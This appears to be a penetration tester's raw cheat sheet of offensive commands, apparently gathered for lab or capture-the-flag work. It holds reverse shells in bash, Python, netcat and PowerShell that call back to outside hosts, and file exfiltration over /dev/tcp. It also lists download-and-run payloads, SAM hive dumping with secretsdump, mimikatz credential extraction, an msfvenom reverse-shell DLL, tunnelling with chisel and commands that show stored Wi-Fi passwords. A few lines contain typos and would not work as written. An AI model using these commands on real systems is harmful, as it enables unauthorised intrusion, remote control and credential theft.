/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.247/443 0>&1'

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export TERM=xterm
stty raw -echo

python -m SimpleHTTPServer

ssh-keygen -l -E md5 -f ssh_host_rsa_key.pub

nc -lvnp 9000 < LinEnum.sh
bash < /dev/tcp/10.10.15.30/9000

';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.92",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

find / -newermt 2018-10-12 ! -newermt 2018-10-14 -type f -ls 2>/dev/null

nc -lvnp 9000 > myfile.pdf
cat myfile.pdf > /dev/tcp/10.10.15.30/9000
nc 10.10.15.30 90000 < myfile

# ping scanner in bash
#!/bin/bash
for i in $(seq 2 254); do
	ping -c 1 -W 1 172.16.20.$i 1>/dev/null 2>&1
	if [[ $? eq 0 ]]; then
		echo "172.16.20.$i - Online"
	fi
done

# port scanner in bash
echo 1 > /dev/tcp/172.16.20.20/$1 1>/dev/null 2>&1
if [[ $? eq 0 ]]; then
	echo "Port $1 is Open"
fi

# powershell magic
ps -name firefox | select id, processName, MainWindowTitle
procdump -ma 1695
Get-ChildItem -recurse | Select-String -pattern "cisco" 
compress-archive -path ./myfile -destinationPath ./myfile.zip

# saving registry hives and fetching data with impacket 
reg save hklm\sam c:\windows\temp\sam.save
reg save hklm\security c:\windows\temp\security.save
reg save hklm\system c:\windows\temp\system.save
python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# mimikatz
sekurlsa::minidump c:\path\to\file.dmp
sekurlsa::logonpasswords

# check if a windows machine has been joined to domain
systeminfo | findstr /B /C:"Domain"

# get all windows drives
fsutil fsinfo drives

# map drive
net use z: \\computerName
net use z: /delete
 
# Installing telnet on windows (cmd)
dism /online /Enable-Feature /FeatureName:TelnetClient

# start a program in windows cmd in background
start /B command_name.exe

# usql connecion to SQL Server
usql.exe mssql://user:password@1.2.3.4/dbname
# fetch all tables from a database in SQL Server
select dbname.information_schema.tables 
# fetch all databases from SQL Server
select name from master.sys.databases

# make a payload ready for python
xxd -p payload.bin | sed 's/../\\x&/g'

IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/myshell.ps1')
powershell Invode-WebRequest -Uri http://10.10.10.10/myshell.ps1
# download with powershell
powershell IWR -Uri http://10.10.10.10/nc.exe -OutFile C:\\windows\\temp\\nc.exe

powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/nc.exe','nc.exe')"

get-ChildName -recurse . | select fullname
gci -recurse . | select fullname

# powershell run command as another user
$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('username', $pass)
Invoke-command -Computer computer_name_xxx -ScriptBlock { cmd.exe /c nc.exe 10.10.10.10 9001 -e powershell.exe } -Credential $cred

#enable up button in powershell (pentest shell)
rlwrap nc.exe -lvnp 9001

#bypassing UAC on windows 
net use Z: \\127.0.0.1\c$
GreatSCT (msbuild)

# native windows base64 encode/decode
certutil -encode infile outfile
certutil -decode infile outfile

# list vhd files 
7z l file.vhd

# chisel port forwarding
./chisel_linux_amd64 server --auth user:pass --reverse -p 443
chisel.exe client --auth user:pass 1.2.3.4:443 R:445:127.0.0.1:445

# windows powershell command history (file path)
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# using powerup (https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
powershell.exe -nop -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt

# check and read NTFS alternate file streams
get-item -force -path file_name.txt -stream *
get-content -force -path file_name.txt -stream alternate_ntfs_stream.txt

#generate payload with msfvenom
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.117 LPORT=9000 -f dll -a x64 -o /opt/windows_tools/rev.dll --platform reg

#show wifi passwords on windows
netsh wlan show profile
netsh wlan show profile “NETWORK NAME” key=clear

# access openvas remotely
/lib/systemd/system/greenbone-security-assistant.service
# openvas scanner timeout error solution:
redis-cli -s /var/run/redis/redis.sock flushall